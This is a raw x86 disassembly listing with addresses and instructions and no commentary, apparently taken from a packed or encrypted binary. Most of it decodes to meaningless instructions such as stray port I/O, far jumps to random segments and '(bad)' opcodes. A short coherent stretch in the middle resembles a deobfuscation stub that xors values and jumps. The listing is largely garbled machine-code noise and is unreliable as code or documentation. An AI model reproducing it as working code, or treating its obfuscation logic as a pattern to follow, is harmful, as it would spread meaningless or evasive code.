  402917:	jmp    0x8b60:0x82b139f4
  40291e:	inc    esi
  40291f:	inc    ecx
  402920:	or     al,BYTE PTR [eax-0x67]
  402923:	jae    0x4028ea
  402925:	cmc    
  402926:	fisub  WORD PTR [eax+0x18]
  402929:	pop    eax
  40292a:	daa    
  40292b:	or     ebx,DWORD PTR [ebp+eax*4-0x4d]
  40292f:	lock jmp DWORD PTR [esi+0x1cdaf1ea]
  402936:	mov    ecx,DWORD PTR [edi+ecx*2]
  402939:	addr16 inc ebx
  40293b:	fiadd  WORD PTR [ecx-0x5d559638]
  402941:	out    dx,al
  402942:	xchg   BYTE PTR [ecx+edi*8],dl
  402945:	imul   esi,ecx,0x383ecbd3
  40294b:	dec    eax
  40294c:	push   eax
  40294d:	test   ebp,esp
  40294f:	loop   0x402900
  402951:	mov    al,0x45
  402953:	or     DWORD PTR [eax],ecx
  402955:	lds    esp,FWORD PTR [edx]
  402957:	outs   dx,DWORD PTR ds:[esi]
  402958:	jnp    0x40299b
  40295a:	lahf   
  40295b:	retf   
  40295c:	pop    eax
  40295d:	call   0xc82bbc18
  402962:	pop    ebp
  402963:	pop    es
  402964:	aam    0x90
  402966:	int    0x31
  402968:	mov    al,ds:0x265c00fb
  40296d:	sti    
  40296e:	retf   
  40296f:	fidiv  DWORD PTR [edx-0x47]
  402972:	xchg   esi,eax
  402973:	push   eax
  402974:	mov    eax,0x72992eb1
  402979:	pavgw  mm2,QWORD PTR [edx-0x5986f03f]
  402980:	outs   dx,DWORD PTR ds:[esi]
  402981:	nop
  402982:	sub    ah,0x2b
  402985:	sub    eax,0xb28f1278
  40298a:	mov    esp,0x3d8eca79
  40298f:	test   BYTE PTR [esi-0x2e],ah
  402992:	lods   eax,DWORD PTR ds:[esi]
  402993:	pop    esi
  402994:	retf   0x9399
  402997:	fs xchg ebp,eax
  402999:	add    eax,0x95a72d6b
  40299e:	in     al,dx
  40299f:	mov    WORD PTR [ebp-0x4f56e8a0],ss
  4029a5:	fimul  DWORD PTR [ebp-0x1cb40549]
  4029ab:	or     ebx,esp
  4029ad:	pop    esi
  4029ae:	hlt    
  4029af:	ss inc edx
  4029b1:	xchg   esi,eax
  4029b2:	or     eax,0xea0f9945
  4029b7:	jnp    0x402956
  4029b9:	das    
  4029ba:	push   eax
  4029bb:	adc    ch,BYTE PTR [edx-0x7f36ab6a]
  4029c1:	inc    ebx
  4029c2:	inc    edi
  4029c3:	das    
  4029c4:	sbb    ecx,ebx
  4029c6:	imul   ebx,DWORD PTR [esi],0x9974101a
  4029cc:	(bad)  
  4029cd:	sbb    ah,BYTE PTR [ecx-0x182e542b]
  4029d3:	(bad)  
  4029d4:	push   ds
  4029d5:	into   
  4029d6:	(bad)  
  4029d7:	lds    ecx,FWORD PTR [edx-0x25cf3c38]
  4029dd:	pushf  
  4029de:	adc    edx,eax
  4029e0:	cs pop ds
  4029e2:	lods   eax,DWORD PTR ds:[esi]
  4029e3:	ds and ecx,ecx
  4029e6:	xor    eax,0x81ecb18e
  4029eb:	aad    0xe1
  4029ed:	in     eax,dx
  4029ee:	inc    esi
  4029ef:	cld    
  4029f0:	fs dec esi
  4029f2:	cmp    dl,ch
  4029f4:	jg     0x402a63
  4029f6:	int    0x8f
  4029f8:	sbb    BYTE PTR [ebx+0x7c],ah
  4029fb:	fidiv  WORD PTR [esi+0x500c0abb]
  402a01:	mov    ecx,0xae747bd2
  402a06:	mov    WORD PTR [ecx+ebp*1-0x63],gs
  402a0a:	(bad)  
  402a0b:	ret    0x8726
  402a0e:	(bad)  
  402a10:	mov    WORD PTR [esi-0x47],cs
  402a13:	dec    ebp
  402a14:	push   edi
  402a15:	sub    ecx,DWORD PTR [eax-0x4b]
  402a18:	out    dx,eax
  402a19:	jno    0x4029b8
  402a1b:	mov    edi,0xb328df05
  402a20:	adc    BYTE PTR ds:[edx+0x38],al
  402a24:	xchg   edx,eax
  402a25:	inc    ebp
  402a26:	mov    ah,0x1b
  402a28:	fisubr DWORD PTR [edi+eax*2-0x70]
  402a2c:	sub    BYTE PTR [eax-0x35],al
  402a2f:	xchg   esi,eax
  402a30:	jmp    0xa8d9:0x31258ae
  402a37:	in     al,0x80
  402a39:	mov    edi,0x9ab232aa
  402a3e:	mov    eax,0x32c7490e
  402a43:	add    DWORD PTR [esi],0xffffffb9
  402a46:	mov    WORD PTR [ebx+0x213d37f1],es
  402a4c:	(bad)  
  402a4d:	mov    edx,0xb72d013f
  402a52:	mov    BYTE PTR [eax+eax*8-0x74],al
  402a56:	jbe    0x402a8d
  402a58:	stc    
  402a59:	bound  eax,QWORD PTR [ecx+0x18]
  402a5c:	mov    BYTE PTR [ecx-0x43],dh
  402a5f:	add    eax,0x16563ecc
  402a64:	inc    esp
  402a65:	out    dx,al
  402a66:	sub    DWORD PTR [edi],0xffffff80
  402a69:	adc    ebp,DWORD PTR [eax]
  402a6b:	call   0xf86bb9ad
  402a70:	dec    ecx
  402a71:	das    
  402a72:	shr    DWORD PTR ss:[edi-0xe9b84a1],0x8b
  402a7a:	mov    ah,dh
  402a7c:	scas   al,BYTE PTR es:[edi]
  402a7d:	lds    ecx,FWORD PTR [edx]
  402a7f:	lahf   
  402a80:	inc    edx
  402a81:	and    al,0x38
  402a83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a84:	xor    al,0x3c
  402a86:	mov    esi,0x93baf5af
  402a8b:	psubsb mm7,QWORD PTR [edx+0xa]
  402a8f:	lods   al,BYTE PTR ds:[esi]
  402a90:	push   ebp
  402a91:	mov    esp,0xf16097c4
  402a96:	pop    eax
  402a97:	aad    0x49
  402a99:	or     dl,dh
  402a9b:	enter  0xc78d,0xed
  402a9f:	out    dx,eax
  402aa0:	je     0x402b03
  402aa2:	retf   
  402aa3:	sub    bl,BYTE PTR [edi-0x5e]
  402aa6:	outs   dx,DWORD PTR ds:[esi]
  402aa7:	ret    0x13a4
  402aaa:	mov    ebp,0x87060c6e
  402aaf:	aam    0xad
  402ab1:	maskmovq mm2,(bad)
  402ab2:	not    DWORD PTR ds:0xe0da95d7
  402ab8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ab9:	sbb    DWORD PTR [eax],esi
  402abb:	jl     0x402b2b
  402abd:	in     al,dx
  402abe:	push   edi
  402abf:	and    DWORD PTR es:[edx],0x1e6a1d51
  402ac6:	add    eax,0x49dd98f0
  402acb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402acc:	push   ds
  402acd:	dec    esp
  402ace:	mov    ebx,0xce23ae9c
  402ad4:	adc    al,0xf2
  402ad6:	and    DWORD PTR [ecx],esi
  402ad8:	adc    bl,BYTE PTR [ebx+0x30]
  402adb:	inc    ebp
  402adc:	(bad)  
  402add:	dec    BYTE PTR [ecx]
  402adf:	push   cs
  402ae0:	push   ss
  402ae1:	push   ds
  402ae2:	mov    eax,ds:0x5269e292
  402ae7:	sub    DWORD PTR [edx-0x75],ebp
  402aea:	mov    eax,edi
  402aec:	in     eax,dx
  402aed:	mov    eax,ds:0x21699304
  402af2:	mov    eax,0x9d72698
  402af7:	xor    DWORD PTR [ebp-0xa],ecx
  402afa:	ins    DWORD PTR es:[edi],dx
  402afb:	mov    al,0xa5
  402afd:	add    eax,0xb194003f
  402b02:	inc    eax
  402b03:	es dec esp
  402b05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b06:	jg     0x402b35
  402b08:	repz shr BYTE PTR ss:[ecx-0x9],0x1d
  402b0e:	fnclex 
  402b10:	and    al,0x3
  402b12:	call   0x6fc52167
  402b17:	pop    edx
  402b18:	mov    esp,edi
  402b1a:	call   0xd08:0x25ae20c0
  402b21:	inc    eax
  402b22:	lock (bad) 
  402b24:	or     al,0xbf
  402b26:	stc    
  402b27:	fnstcw WORD PTR [edi+0x39]
  402b2a:	add    ebp,eax
  402b2c:	hlt    
  402b2d:	sub    esi,DWORD PTR [ebp-0x5bf62b7d]
  402b33:	pop    ds
  402b34:	push   ecx
  402b35:	dec    ebp
  402b36:	fmul   DWORD PTR [ecx+0x40]
  402b39:	push   ebp
  402b3a:	xchg   ebx,eax
  402b3b:	icebp  
  402b3c:	pop    ebp
  402b3d:	fdivr  DWORD PTR [eax-0x30a59243]
  402b43:	icebp  
  402b44:	mov    ah,0x2b
  402b46:	mov    dl,0xaf
  402b48:	shl    BYTE PTR [edx+0x5b58de13],1
  402b4e:	jne    0x402b09
  402b50:	and    BYTE PTR [edx],bh
  402b52:	jecxz  0x402afc
  402b54:	push   esp
  402b55:	mov    eax,ds:0x1d18d4e5
  402b5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b5b:	sahf   
  402b5c:	jecxz  0x402bdd
  402b5e:	xor    BYTE PTR [ebx+0x71325c03],0xfb
  402b65:	mov    DWORD PTR [esi+0x5e788986],ebp
  402b6b:	das    
  402b6c:	lahf   
  402b6d:	jecxz  0x402b9b
  402b6f:	js     0x402bef
  402b71:	dec    edx
  402b72:	mov    DWORD PTR [edx],edx
  402b74:	iret   
  402b75:	mov    al,0x78
  402b77:	jmp    0xdf0b:0xf308c4fa
  402b7e:	lods   eax,DWORD PTR ds:[esi]
  402b7f:	lds    ecx,FWORD PTR [eax+0xff9ff4b]
  402b85:	sar    DWORD PTR [edi],cl
  402b87:	jo     0x402bd5
  402b89:	mov    ebx,0x1a9d5754
  402b8e:	inc    esi
  402b8f:	leave  
  402b90:	jle    0x402b6f
  402b92:	jge    0x402b3d
  402b94:	xchg   edi,eax
  402b95:	push   ebx
  402b96:	inc    eax
  402b97:	cmp    al,0x8b
  402b99:	test   BYTE PTR [esi-0x19],al
  402b9c:	jae    0x402c1d
  402b9e:	ds push ebp
  402ba0:	pop    ebx
  402ba1:	mov    ch,0xc4
  402ba3:	adc    al,0x8
  402ba5:	mov    ebx,0x83ff5e07
  402baa:	gs dec eax
  402bac:	lods   al,BYTE PTR ds:[esi]
  402bad:	mov    al,ds:0xc6a620e2
  402bb2:	cmp    BYTE PTR [ecx-0x5e],cl
  402bb5:	data16 jmp 0x402b4c
  402bb8:	xchg   bl,ch
  402bba:	inc    DWORD PTR [ecx+0x6]
  402bbd:	add    BYTE PTR [esi+ebx*1],bh
  402bc0:	mov    al,0x42
  402bc2:	fdivr  DWORD PTR ds:0xffc7329a
  402bc8:	or     DWORD PTR [eax+0xe],ebp
  402bcb:	jge    0x402bf5
  402bcd:	mul    BYTE PTR [esi+0x75]
  402bd0:	dec    edx
  402bd1:	jb     0x402c23
  402bd3:	loopne 0x402c50
  402bd5:	test   eax,0x515fb3ad
  402bda:	adc    BYTE PTR [edi+esi*8-0x38f22236],ah
  402be1:	jne    0x402bcc
  402be3:	call   FWORD PTR [eax+0x33]
  402be6:	xor    BYTE PTR [ecx],cl
  402be8:	sbb    al,0x32
  402bea:	xchg   dh,ah
  402bec:	in     al,dx
  402bed:	clc    
  402bee:	cmp    DWORD PTR [eax],edx
  402bf0:	das    
  402bf1:	fs je  0x402ba6
  402bf4:	mov    ds:0x34697157,eax
  402bf9:	ins    BYTE PTR es:[edi],dx
  402bfa:	xor    ecx,edx
  402bfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bfd:	iret   
  402bfe:	mov    ds:0x485123d2,al
  402c03:	retf   
  402c04:	cmp    ah,dh
  402c06:	inc    eax
  402c07:	int    0xf5
  402c09:	cmp    eax,0x3bd42c68
  402c0e:	mov    bl,0xc6
  402c10:	in     al,dx
  402c11:	xchg   edx,eax
  402c12:	pop    ds
  402c13:	ret    
  402c14:	stc    
  402c15:	hlt    
  402c16:	fnstsw WORD PTR [eax-0x51]
  402c19:	(bad)  
  402c1a:	mov    ebx,0x6feb58f5
  402c1f:	xchg   DWORD PTR [ebx-0x5],esp
  402c22:	clc    
  402c23:	mov    ecx,0x2c2cd427
  402c28:	xor    ebx,DWORD PTR [eax-0x37]
  402c2b:	out    dx,al
  402c2c:	inc    esp
  402c2d:	(bad)  
  402c2e:	mov    dh,0xb9
  402c30:	xor    bh,BYTE PTR [esi+ebx*1-0x4f380f3b]
  402c37:	ficomp WORD PTR [ebp-0x1564979f]
  402c3d:	rol    BYTE PTR [ecx+0x7bc3f30],0x8e
  402c44:	and    esi,DWORD PTR [edx+ebp*1]
  402c47:	xchg   ecx,eax
  402c48:	ss into 
  402c4a:	mov    eax,0x241be339
  402c4f:	sbb    ebx,ebx
  402c51:	inc    ebx
  402c52:	lds    esi,FWORD PTR [edx+0x6]
  402c55:	mov    ecx,0xed7e2f54
  402c5a:	xchg   ebx,eax
  402c5b:	xchg   BYTE PTR [ecx-0x49f7cbc2],bh
  402c61:	jno    0x402bea
  402c63:	push   edx
  402c64:	inc    esp
  402c65:	mov    BYTE PTR [eax-0x79],bl
  402c68:	sbb    DWORD PTR [esi+ebx*1],esp
  402c6b:	jle    0x402cd3
  402c6d:	int    0xe5
  402c6f:	hlt    
  402c70:	mov    cs,WORD PTR [esi-0x32]
  402c73:	xchg   edx,eax
  402c74:	out    dx,al
  402c75:	add    eax,0xfc6d184d
  402c7a:	pushf  
  402c7b:	xor    eax,0x88148d5a
  402c80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c81:	adc    DWORD PTR [edx],0x68
  402c84:	jp     0x402c38
  402c86:	aad    0x3e
  402c88:	pop    esp
  402c89:	and    ah,BYTE PTR [esi+0x44]
  402c8c:	out    dx,eax
  402c8d:	adc    al,0xc6
  402c8f:	xchg   ecx,eax
  402c90:	mov    ecx,0x4679e692
  402c95:	mov    ds:0x70818845,al
  402c9a:	fisttp WORD PTR [edi]
  402c9c:	test   DWORD PTR [ecx-0x37],0x64d36840
  402ca3:	xchg   edx,eax
  402ca4:	jo     0x402c63
  402ca6:	out    dx,al
  402ca7:	push   esi
  402ca8:	(bad)  
  402ca9:	mov    ebp,DWORD PTR [edi+0x4c37946f]
  402caf:	xchg   ecx,eax
  402cb0:	lock hlt 
  402cb2:	addr16 in eax,dx
  402cb4:	inc    esp
  402cb5:	mov    esp,0x97e2938e
  402cba:	test   BYTE PTR [eax],al
  402cbc:	sbb    DWORD PTR [eax],esp
  402cbe:	mov    bl,0x5
  402cc0:	stos   BYTE PTR es:[edi],al
  402cc1:	add    BYTE PTR [eax],al
  402cc3:	add    BYTE PTR [eax-0x75],dl
  402cc6:	inc    ebp
  402cc7:	call   0x1d8ad57
  402ccc:	add    BYTE PTR [eax],al
  402cce:	push   DWORD PTR [eax]
  402cd0:	call   0x40c099
  402cd5:	mov    DWORD PTR [ebp-0x4],eax
  402cd8:	cmp    DWORD PTR [ebp-0x4],0x0
  402cdc:	lea    eax,[ebp+0x4]
  402cdf:	mov    DWORD PTR [ebp-0x38],eax
  402ce2:	je     0x404656
  402ce8:	lea    eax,[ebp-0xc]
  402ceb:	mov    DWORD PTR [ebp-0x30],eax
  402cee:	mov    eax,DWORD PTR [ebp-0x4c]
  402cf1:	xor    eax,esi
  402cf3:	add    eax,edi
  402cf5:	mov    DWORD PTR [ebp-0x34],eax
  402cf8:	mov    eax,DWORD PTR [ebp-0x28]
  402cfb:	xor    eax,esi
  402cfd:	add    eax,edi
  402cff:	mov    DWORD PTR [ebp-0x20],eax
  402d02:	mov    eax,DWORD PTR [ebp-0x4]
  402d05:	mov    DWORD PTR [ebp-0x24],eax
  402d08:	lea    eax,[ebp-0x98]
  402d0e:	mov    DWORD PTR [ebp-0x8],eax
  402d11:	mov    eax,DWORD PTR [ebp-0x10]
  402d14:	mov    DWORD PTR [ebp-0x10],eax
  402d17:	mov    eax,DWORD PTR [ebp-0x1c]
  402d1a:	mov    DWORD PTR [ebp-0x40],ebx
  402d1d:	mov    DWORD PTR [ebp-0x2c],eax
  402d20:	mov    eax,DWORD PTR [ebp-0x40]
  402d23:	mov    ecx,DWORD PTR [ebp-0x8]
  402d26:	xor    eax,esi
  402d28:	add    eax,0x32729b
  402d2d:	jmp    0x40313b
  402d32:	stos   DWORD PTR es:[edi],eax
  402d33:	addr16 clc 
  402d35:	in     eax,0x50
  402d37:	loope  0x402dac
  402d39:	jno    0x402d4f
  402d3b:	jo     0x402d34
  402d3d:	outs   dx,BYTE PTR fs:[esi]
  402d3f:	dec    esp
  402d40:	in     eax,0x80
  402d42:	cwde   
  402d43:	or     DWORD PTR [esi+0x7e],edi
  402d46:	outs   dx,DWORD PTR ds:[esi]
  402d47:	jge    0x402dc7
  402d49:	jle    0x402cd1
  402d4b:	mov    bh,0x81
  402d4d:	adc    al,BYTE PTR [edi+0x8f2d9d3]
  402d53:	mov    esi,0x8ef9754
  402d58:	push   esp
  402d59:	retf   0xa286
  402d5c:	fist   DWORD PTR [ebx]
  402d5e:	and    eax,0x60f87371
  402d63:	(bad)  [edi-0x655b3524]
  402d69:	dec    edi
  402d6a:	es ss push cs
  402d6d:	xchg   BYTE PTR [ecx+0x49c8a2e8],bl
  402d73:	aam    0x15
  402d75:	in     eax,dx
  402d76:	jns    0x402dd2
  402d78:	je     0x402dc4
  402d7a:	inc    ebp
  402d7b:	out    dx,al
  402d7c:	ret    
  402d7d:	cmp    DWORD PTR [edx-0x71],ebx
  402d80:	sar    DWORD PTR [edx+0x1],0xb3
  402d84:	mov    bl,0x4e
  402d86:	add    BYTE PTR [eax+0x3640689c],al
  402d8c:	mov    ch,0xd6
  402d8e:	pop    edx
  402d8f:	jns    0x402d6f
  402d91:	jae    0x402d82
  402d93:	cmc    
  402d94:	jne    0x402d31
  402d96:	test   al,0xe5
  402d98:	into   
  402d99:	inc    ebx
  402d9a:	mov    edx,0xeec090d2
  402d9f:	add    al,0xd2
  402da1:	repnz mov bl,0x37
  402da4:	aas    
  402da5:	ret    0x7f9d
  402da8:	adc    bl,BYTE PTR [edx+0x30]
  402dab:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  402dad:	sbb    eax,0xefd5bfb9
  402db2:	nop
  402db3:	inc    edi
  402db4:	jmp    0x8cbd:0x973f3f65
  402dbb:	mov    BYTE PTR [ecx+0x28a35d88],dh
  402dc1:	fnstcw WORD PTR [ebx-0x6ce64279]
  402dc7:	fadd   st(7),st
  402dc9:	inc    esp
  402dca:	daa    
  402dcb:	into   
  402dcc:	push   ecx
  402dcd:	call   DWORD PTR [edi-0x70]
  402dd0:	cs ret 0x4ca8
  402dd4:	sub    bh,ah
  402dd6:	arpl   WORD PTR [edi+ebp*8-0x7d],bp
  402dda:	ret    0x5e83
  402ddd:	jl     0x402dbb
  402ddf:	mov    cl,0x4
  402de1:	mov    ss,ebp
  402de3:	mov    ch,0x85
  402de5:	(bad)  
  402de6:	out    0xbf,eax
  402de8:	(bad)  
  402de9:	xchg   esp,eax
  402dea:	test   al,0x4f
  402dec:	std    
  402ded:	dec    esp
  402dee:	out    dx,eax
  402def:	sbb    al,0x59
  402df1:	mov    ch,0x42
  402df3:	jbe    0x402db6
  402df5:	adc    bl,BYTE PTR [eax+0x3ba89dbc]
  402dfb:	cld    
  402dfc:	enter  0xcf32,0x79
  402e00:	xchg   edi,eax
  402e01:	out    0xd2,al
  402e03:	push   ebx
  402e04:	out    0xb5,al
  402e06:	in     eax,0xe8
  402e08:	ret    
  402e09:	ds pop edi
  402e0b:	xor    DWORD PTR [ecx-0x53479f83],ecx
  402e11:	jg     0x402d9b
  402e13:	mov    ecx,0x2cb03aac
  402e18:	(bad)  
  402e19:	cld    
  402e1a:	ins    BYTE PTR es:[edi],dx
  402e1b:	xor    eax,0xd5198acc
  402e20:	ret    0xe49e
  402e23:	xchg   BYTE PTR [edx+esi*4],cl
  402e26:	cs js  0x402e13
  402e29:	jge    0x402e15
  402e2b:	push   0x79
  402e2d:	dec    esp
  402e2e:	(bad)  
  402e2f:	cdq    
  402e30:	in     al,0x5e
  402e32:	pop    eax
  402e33:	rol    DWORD PTR [ecx+0x23],cl
  402e36:	xchg   BYTE PTR [ecx+0x49ea9a8a],bh
  402e3c:	lahf   
  402e3d:	sbb    esi,esi
  402e3f:	adc    dh,0x61
  402e42:	xchg   DWORD PTR [esi-0x7058c49a],ecx
  402e48:	cmp    eax,DWORD PTR [ebp-0x31c482b9]
  402e4e:	out    dx,eax
  402e4f:	sub    eax,0x376cc4b0
  402e54:	mov    ds:0x4f8dafb3,al
  402e59:	in     al,dx
  402e5a:	sbb    esi,DWORD PTR [ebp+0x7]
  402e5d:	enter  0xc100,0x93
  402e61:	inc    esp
  402e62:	sti    
  402e63:	mov    esi,0xd351f0f6
  402e68:	int3   
  402e69:	fbld   TBYTE PTR [ebx+0x63]
  402e6c:	dec    esp
  402e6d:	add    DWORD PTR [ecx+0x7d],esp
  402e70:	into   
  402e71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e72:	pop    esi
  402e73:	push   esi
  402e74:	xor    BYTE PTR [esi+edi*8+0x5fcb5e96],cl
  402e7b:	inc    esp
  402e7c:	sub    BYTE PTR [eax-0x1e038330],0x13
  402e83:	outs   dx,BYTE PTR ds:[esi]
  402e84:	mov    ebp,0xa410c8f9
  402e89:	mov    ebp,0xffd3f78f
  402e8e:	add    DWORD PTR [eax-0x5d429fed],0xffffff84
  402e95:	loope  0x402eef
  402e97:	or     dl,BYTE PTR [ebx]
  402e99:	iret   
  402e9a:	test   eax,0x3995b495
  402e9f:	fisub  DWORD PTR [edx-0x31]
  402ea2:	add    al,0xfc
  402ea4:	add    ebx,DWORD PTR [esi]
  402ea6:	lods   al,BYTE PTR ds:[esi]
  402ea7:	sti    
  402ea8:	in     eax,dx
  402ea9:	jle    0x402e9b
  402eab:	mov    bl,0xcb
  402ead:	das    
  402eae:	pop    ebx
  402eaf:	pop    ecx
  402eb0:	xor    bl,ah
  402eb2:	sbb    dh,BYTE PTR [ecx-0x6a251f8]
  402eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eb9:	mov    al,ds:0x56bf1074
  402ebe:	clc    
  402ebf:	or     DWORD PTR [edx+edx*8-0x1a],0x34935f30
  402ec7:	push   ebp
  402ec8:	repnz add ah,bh
  402ecb:	test   BYTE PTR [esi+edx*2-0x58],bl
  402ecf:	out    dx,al
  402ed0:	mov    BYTE PTR [eax+0x55a23eb1],bl
  402ed6:	loopne 0x402f45
  402ed8:	into   
  402ed9:	mov    ecx,0x69179b99
  402ede:	lods   eax,DWORD PTR ds:[esi]
  402edf:	aad    0x2a
  402ee1:	jne    0x402ea7
  402ee3:	leave  
  402ee4:	rcl    BYTE PTR [edx],cl
  402ee6:	xor    BYTE PTR [ecx-0x49f28bf1],al
  402eec:	sbb    ecx,DWORD PTR [edx]
  402eee:	xor    ah,BYTE PTR [edx+0x459bc720]
  402ef4:	pop    ebx
  402ef5:	(bad)  
  402ef6:	push   ss
  402ef7:	push   0xbcb21959
  402efc:	in     al,0x2d
  402efe:	jnp    0x402ef7
  402f00:	(bad)  
  402f01:	ja     0x402e9e
  402f03:	or     cl,al
  402f05:	pop    edi
  402f06:	call   0x2722a6bf
  402f0b:	popf   
  402f0c:	push   0x8271825b
  402f11:	leave  
  402f12:	push   es
  402f13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f14:	jnp    0x402ee1
  402f16:	and    BYTE PTR [ebp+0x1a],bh
  402f19:	cmp    eax,DWORD PTR [edx+0x79]
  402f1c:	push   edx
  402f1d:	adc    eax,0xf149a8d3
  402f22:	mov    cl,0x76
  402f24:	xchg   ebp,eax
  402f25:	shl    bl,1
  402f27:	mov    dl,cl
  402f29:	cmp    dh,BYTE PTR [ebp+esi*2-0xf]
  402f2d:	(bad)  
  402f2e:	cmp    eax,0xa8e560cf
  402f33:	add    ebp,DWORD PTR [edi+0x19b55f54]
  402f39:	mov    al,0x51
  402f3b:	xchg   ecx,eax
  402f3c:	pop    edx
  402f3d:	and    dh,BYTE PTR [eax+0x36538da0]
  402f43:	push   ds
  402f44:	fld    DWORD PTR [ebx]
  402f46:	push   ebp
  402f47:	mul    DWORD PTR [edi]
  402f49:	ss dec edi
  402f4b:	jbe    0x402f79
  402f4d:	xchg   edi,eax
  402f4e:	lahf   
  402f4f:	dec    edx
  402f50:	sbb    al,0x9f
  402f52:	sti    
  402f53:	stos   DWORD PTR es:[edi],eax
  402f54:	mov    esi,0x88b5ecf1
  402f59:	ret    0xd182
  402f5c:	push   esi
  402f5d:	(bad)  
  402f5e:	fdivr  QWORD PTR [ebx+0x37952a10]
  402f64:	pop    esp
  402f65:	in     eax,0x77
  402f67:	lock jne 0x402f04
  402f6a:	lock ins DWORD PTR es:[edi],dx
  402f6c:	out    0x7c,eax
  402f6e:	jns    0x402f5f
  402f70:	adc    ecx,0x1a
  402f73:	mov    ebp,cs
  402f75:	xchg   edi,eax
  402f76:	dec    ebx
  402f77:	sbb    esi,DWORD PTR [edx+0x26]
  402f7a:	stos   DWORD PTR es:[edi],eax
  402f7b:	fdivr  st,st(0)
  402f7d:	jmp    0x402f9f
  402f7f:	xchg   esp,eax
  402f80:	inc    edx
  402f81:	mov    ds:0x87ef9301,al
  402f86:	sbb    DWORD PTR [edi-0x4f3fcc],edi
  402f8c:	xor    BYTE PTR [ecx-0x3b],al
  402f8f:	in     al,0xe2
  402f91:	mov    ecx,DWORD PTR [esi+0x1d1f981c]
  402f97:	mov    esi,0xac6b93af
  402f9c:	inc    esp
  402f9d:	sub    bl,bh
  402f9f:	xchg   edi,eax
  402fa0:	icebp  
  402fa1:	out    0x85,al
  402fa3:	xor    DWORD PTR [ebp+0x1fed795b],esi
  402fa9:	jnp    0x402fca
  402fab:	ret    
  402fac:	dec    ecx
  402fad:	dec    eax
  402fae:	iret   
  402faf:	fstp   DWORD PTR [ebx+0xb]
  402fb2:	cmc    
  402fb3:	or     eax,0x52f900b1
  402fb8:	scas   al,BYTE PTR es:[edi]
  402fb9:	out    0x36,al
  402fbb:	fwait
  402fbc:	push   ebx
  402fbd:	push   edx
  402fbe:	lahf   
  402fbf:	push   eax
  402fc0:	clc    
  402fc1:	les    ecx,FWORD PTR ds:0x7fa60b79
  402fc7:	xor    eax,DWORD PTR [ecx]
  402fc9:	push   ss
  402fca:	inc    esp
  402fcb:	or     ah,BYTE PTR [eax*4+0x2683be17]
  402fd2:	ds sbb al,0x9
  402fd5:	fnstcw WORD PTR ds:0x69cf3476
  402fdb:	clc    
  402fdc:	or     DWORD PTR [edi-0x2ff76779],esp
  402fe2:	xchg   ecx,eax
  402fe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fe4:	mov    edi,0x6a8be8fc
  402fe9:	cmp    eax,0xc4e86225
  402fee:	cwde   
  402fef:	mov    ds:0x61ae9072,eax
  402ff4:	cmp    BYTE PTR [eax-0xe],bl
  402ff7:	mov    dl,0xfd
  402ff9:	dec    ebp
  402ffa:	inc    edi
  402ffb:	clc    
  402ffc:	gs sti 
  402ffe:	inc    ecx
  402fff:	xor    dl,BYTE PTR [esi+eax*4]
  403002:	fimul  WORD PTR [ecx]
  403004:	pusha  
  403005:	ds pop esp
  403007:	sbb    DWORD PTR [edx],0xffffffd2
  40300a:	xchg   edi,eax
  40300b:	repnz xchg esp,eax
  40300d:	xchg   esi,eax
  40300e:	push   edi
  40300f:	or     edx,ecx
  403011:	jge    0x40305a
  403013:	js     0x403043
  403015:	push   esi
  403016:	and    ecx,DWORD PTR [eax-0x38c0a8d5]
  40301c:	cs sti 
  40301e:	leave  
  40301f:	adc    BYTE PTR [ecx-0x13274eca],dl
  403025:	jmp    ecx
  403027:	call   0xfb439a81
  40302c:	jge    0x403059
  40302e:	hlt    
  40302f:	jecxz  0x403036
  403031:	icebp  
  403032:	(bad)  
  403033:	test   eax,0xf013d435
  403038:	jo     0x4030a8
  40303a:	ins    BYTE PTR es:[edi],dx
  40303b:	hlt    
  40303c:	stos   BYTE PTR es:[edi],al
  40303d:	ins    DWORD PTR es:[edi],dx
  40303e:	call   0xd04a:0xe34a97e1
  403045:	cdq    
  403046:	pop    ds
  403047:	adc    esi,esi
  403049:	mov    bh,0xde
  40304b:	pushf  
  40304c:	push   edx
  40304d:	adc    DWORD PTR [ebx-0x8],ebx
  403050:	add    ebp,esp
  403052:	cpuid  
  403054:	es jle 0x4030ba
  403057:	ret    0x9f94
  40305a:	pusha  
  40305b:	pop    eax
  40305c:	adc    eax,0x936bf5a9
  403061:	xor    DWORD PTR [edx-0x136e8cb],ebp
  403067:	push   ecx
  403068:	and    eax,0x91b38c24
  40306d:	(bad)  
  40306e:	retf   
  40306f:	dec    ebp
  403070:	dec    esi
  403071:	stos   DWORD PTR es:[edi],eax
  403072:	adc    DWORD PTR [esp+edi*2],edi
  403075:	pushf  
  403076:	mov    cs,WORD PTR [edx]
  403078:	imul   ebp,ecx,0x4132acd8
  40307e:	adc    DWORD PTR [esi-0x5d],edi
  403081:	jne    0x40302d
  403083:	pop    esp
  403084:	xor    esi,DWORD PTR [ecx+esi*1-0x24cf0cf2]
  40308b:	sub    DWORD PTR [ecx-0x5c],esi
  40308e:	inc    edi
  40308f:	add    BYTE PTR ds:0x4e0730f8,0x1f
  403096:	call   0xc701:0xefd2829a
  40309d:	(bad)  
  40309e:	ds push es
  4030a0:	jge    0x4030b1
  4030a2:	mov    al,ds:0x9a407f8
  4030a7:	push   0x56c4aefb
  4030ac:	fdivr  QWORD PTR [ebp-0x694681f1]
  4030b2:	seto   BYTE PTR [eax+0x1e4ebaf6]
  4030b9:	lods   eax,DWORD PTR ds:[esi]
  4030ba:	xlat   BYTE PTR ds:[ebx]
  4030bb:	add    BYTE PTR [edx-0x4f57232f],bl
  4030c1:	jbe    0x40312a
  4030c3:	ins    DWORD PTR es:[edi],dx
  4030c4:	fcom   DWORD PTR [edi+ecx*8]
  4030c7:	pop    esp
  4030c8:	inc    ecx
  4030c9:	es ja  0x403142
  4030cc:	je     0x403132
